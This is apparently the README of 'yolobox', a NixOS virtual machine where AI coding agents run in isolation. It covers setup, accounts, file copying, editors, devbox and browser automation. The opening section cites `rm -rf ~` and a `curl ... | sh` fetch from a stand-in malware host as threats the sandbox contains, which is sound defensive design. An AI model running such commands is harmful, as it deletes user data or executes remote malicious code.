# yolobox

A Linux VM on your host where AI coding agents do their work.

NixOS machine, run by Lima, devbox, batteries included.

## Why this exists

- Agents blast radius (protects against `rm -rf ~`, `curl http://H4x0r-malware.sh | sh`)
- Supply chain attacks
- Slow macOS disk due to `systempolicyd` scans (macOS only)

### Prerequisites

#### macOS

[1Password](https://1password.com/) with its SSH agent enabled (it holds your keys).

```bash
brew install aka-rider/tap/yolobox
```

#### Linux

[Nix](https://nixos.org/download/) with flakes enabled; it brings Lima and QEMU. KVM: `/dev/kvm` must exist and be readable and writable by your user (enable virtualization in firmware, load the `kvm` module, join the `kvm` group). [1Password](https://1password.com/) for Linux with its SSH agent enabled, which listens at `~/.1password/agent.sock`.

```bash
nix run github:aka-rider/yolobox -- --help
```

`yo` from a release older than the first one with Linux support pins an aarch64-only flake ref, so until such a release exists, bootstrap from a branch instead:

```bash
YOLOBOX_FLAKE=github:aka-rider/yolobox/<branch> yo bootstrap
```

`yo pair` prints a URL on this host's LAN IP. With firewalld running, other devices reach it only once the port is open:

```bash
sudo firewall-cmd --add-port=3773/tcp
```

On a Mac, `nix run github:aka-rider/yolobox` runs the same release without a `brew` install at all.

## Quickstart

Create and build the VM once:

```bash
yo bootstrap     # create the VM, build NixOS from the pinned yolobox release, seed identities; rerunnable
```

Add this to your `~/.ssh/config`

```
Include ~/.lima/yolobox/ssh.config
```

## Basic shell operation

The VM has two accounts: you, the **operator** (`${username}`, matched to your Mac account, the only one with sudo), and `agent`, the account every AI coding session runs as, with no sudo at all.

- `yo ssh` to enter the bare **operator** session (for VM maintenance)
- `yo enter` for daily usage

`yo enter` (and other commands: `yo code`, `yo zed`) try to match the current directory in the VM, so `cd ~/code/project && yo enter` should land you into `~/code/project` on the VM guest, if the directory does exist in the VM.

You can use many commands with fuzzy project name. The search is done among directories with `.git`

If you have `~/code/some-project`, then `yo enter proj`, `yo code proj`, `yo zed proj` will all get you there.


### Copying between host and guest

`yo cp SRC... DST` copies files between the Host and the Guest, scp-style. Leading `:` colon symbol means guest (like in scp). This commands tries to mirror the current directory as well.

```sh
cd <project> && yo cp README.md :  # host -> guest
yo cp :notes.md ~/Desktop/         # guest -> host
yo cp a.txt b.txt :dump/           # multiple sources -> one guest directory
```


Run `yo --help` for the rest of the commands.

### herdr terminal multiplexer

[https://herdr.dev/](https://herdr.dev/)

The VM runs its own herdr server, as the `agent` account, up from boot.

```bash
herdr machine add yolobox --label yolobox
```

Run `cd myproj && yo enter` or `yo enter <fuzzy search>`.

herdr documents sharing clipboard images to a remote client over a machine connection;

### T3 code web and mobile

[https://t3.codes/](https://t3.codes/)

```bash
yo t3
```

T3 code can be paired remotely, so you could manage a fleet of VMs, servers, laptops using the same UI.
T3 Code gives you a mobile app, as a bonus.

### Zed and Visual Studio Code

Run (`yo zed`, or `yo code` respectively).

Both commands try to match paths between host and guest.

```bash
cd ~/code/myproject && yo code # will open myproject inside the VM if it exists
```

Both commands support fuzzy search

```bash
yo code myproj  # you don't need to be precise
```

Note: Zed's own downloaded language servers do not work on NixOS: Zed strips the environment when spawning them, and nix-ld cannot rescue that.
Add LSPs to `devbox.json` instead, so they run through devbox's own environment rather than Zed's.

### Devbox

Inside the VM, give the project its toolchain with [devbox](https://www.jetify.com/devbox) (Nix Package Registry).

```bash
devbox init
devbox add typescript bun nodejs
devbox run -- bun --version

# alternatively
devbox shell
```

Find packages with `devbox search <name>`.

## Make the VM your own

First of all, fork the repo, steal the idea, turn into whatever you want.

To add a tool for everyday use, say `helix` or `neovim`, drop it into `/etc/yolobox/local.nix` inside the VM.

Then rebuild:

```bash
sudo YOLOBOX_USERNAME=$(id -un) nixos-rebuild switch --impure --flake 'github:aka-rider/yolobox/v<version>#yolobox'
```


Four settings in `lima/yolobox.yaml` — `disk`, `portForwards`, `memory`, and `cpus` — are read once, when the VM is created. Changing the file later does nothing to an existing VM; stop it and use `limactl edit yolobox`.
For memory and CPUs:

```bash
limactl stop yolobox && limactl edit yolobox --memory 16 --cpus 8 --start
```

## Browser & Virtual Display

The VM runs a virtual display (`:0`, 1920x1080), so an agent can drive a real browser and take screenshots.

claude reaches it through the official `playwright` plugin, installed for you from Anthropic's marketplace; pi reaches it through `agent-browser`. Both drive the same Chromium the VM ships — Playwright's own browser downloads do not run on NixOS, so the box points them at it — headed on the display for Playwright, headless by default for `agent-browser`.

Browser output — screenshots, PDFs, videos — is written to `~/artifacts/`, outside the project checkout, so the push channel never carries stray binaries. `yolobox-screen-record start|stop` records the whole display into the same place.

The agents themselves (`claude`, `pi`, `opencode`) are installed from their vendors into the VM and update themselves; `claude update` works as usual.


## Credits

[Lima: Linux Machines](https://github.com/lima-vm/lima)
[NixOS](https://nixos.org/)
[devbox](https://github.com/jetify-com/devbox)
